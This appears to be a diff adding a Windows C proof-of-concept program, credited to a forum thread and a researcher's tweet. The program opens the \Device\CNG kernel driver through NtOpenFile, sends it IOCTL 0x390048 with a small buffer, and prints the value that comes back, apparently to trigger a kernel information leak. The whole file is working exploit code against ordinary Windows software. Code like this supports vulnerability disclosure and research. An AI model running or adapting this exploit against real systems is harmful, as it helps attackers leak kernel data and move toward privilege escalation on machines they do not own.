@@ -1,0 +1,62 @@
+// Source: http://www.binvul.com/viewthread.php?tid=508
+// Source: https://twitter.com/NTarakanov/status/598370525132423168
+
+
+#include <windows.h>
+#include <winternl.h>
+#include <stdio.h>
+#pragma  comment(lib, "ntdll.lib")
+
+
+
+int main(int argc, CHAR* argv[]) {
+        typedef NTSTATUS  (__stdcall *NT_OPEN_FILE)(OUT PHANDLE FileHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, OUT PIO_STATUS_BLOCK IoStatusBlock, IN ULONG ShareAccess, IN ULONG OpenOptions);
+        NT_OPEN_FILE NtOpenFileStruct;
+
+        PVOID Info;
+        HMODULE hModule = LoadLibrary(("ntdll.dll"));
+        NtOpenFileStruct = (NT_OPEN_FILE)GetProcAddress(hModule, "NtOpenFile");
+        if(NtOpenFileStruct == NULL) {
+                exit(-1);
+        }
+        
+
+
+        UNICODE_STRING filename;
+        RtlInitUnicodeString(&filename, L"\\Device\\CNG");
+
+        
+        OBJECT_ATTRIBUTES obja;
+        obja.Attributes        =        0x40;
+        obja.ObjectName =   &filename;
+        obja.Length                =        0x18;
+        obja.RootDirectory        =        NULL;
+        obja.SecurityDescriptor        =        NULL;
+        obja.SecurityQualityOfService        =        NULL;
+        
+        IO_STATUS_BLOCK iostatusblock;
+        HANDLE hCNG   = NULL;
+        NTSTATUS stat = NtOpenFileStruct(&hCNG, 0x100001, &obja, &iostatusblock, 7, 0x20);
+        if(NT_SUCCESS(stat)) {
+                printf("File successfully opened.\n");
+        }
+        else {
+                printf("File could not be opened.\n");
+                return -1;
+        }
+        DWORD dwBuffer = 0;
+        DWORD dwCnt           = 0;
+        BOOL  bRet = DeviceIoControl((HANDLE)hCNG, 0x390048, &dwBuffer, 4, &dwBuffer, 4, &dwCnt, NULL);
+        if (FALSE == bRet)
+        {
+                printf("[*]Send IOCTL fail!\n");
+                printf("[*]Error Code:%d\n", GetLastError());
+        }
+        else
+        {
+                printf("[*]0x%08x\n", dwBuffer);        
+        }
+        CloseHandle(hCNG);
+        getchar();
+        return 0;
+}
